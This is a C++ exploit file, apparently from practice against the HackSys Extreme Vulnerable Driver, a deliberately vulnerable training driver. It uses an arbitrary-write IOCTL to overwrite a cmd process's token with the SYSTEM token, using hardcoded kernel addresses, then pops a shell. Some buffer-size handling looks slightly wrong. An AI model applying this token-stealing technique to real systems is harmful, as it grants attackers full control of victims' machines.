#include "ArbitraryWrite.hpp"
#include "PostExploitation.hpp"
#include "HEVDCommunication.hpp"

#include <iostream>

namespace ArbitraryWrite
{

void exploit()
{
	HEVDCommunication hevd;
	
	ByteVector in_buffer;
	in_buffer.resize(sizeof(WriteWhatWhere) + sizeof(wchar_t));
	std::memset(in_buffer.data(), 0, sizeof(in_buffer));
	// ffffbe8c004b1080 cmd eprocess (+0x248 for token)
	// ffffbe8bf96ac040 system eprocess (+0x248 for token)
	WriteWhatWhere www = { .What = 0xffffbe8bf96ac040 + 0x248, .Where = 0xffffbe8c004b1080 + 0x248 }; // Change token of owning cmd to system
	std::memcpy(in_buffer.data(), &www, sizeof(WriteWhatWhere));

	std::ignore = hevd.call_ioctl(ARBITRARY_WRITE_IOCTL, in_buffer, sizeof(Address64));

	PostExploitation::pop_shell(); // useless here because im chaning the token of the owning cmd, but just for the wow factor :)
}

}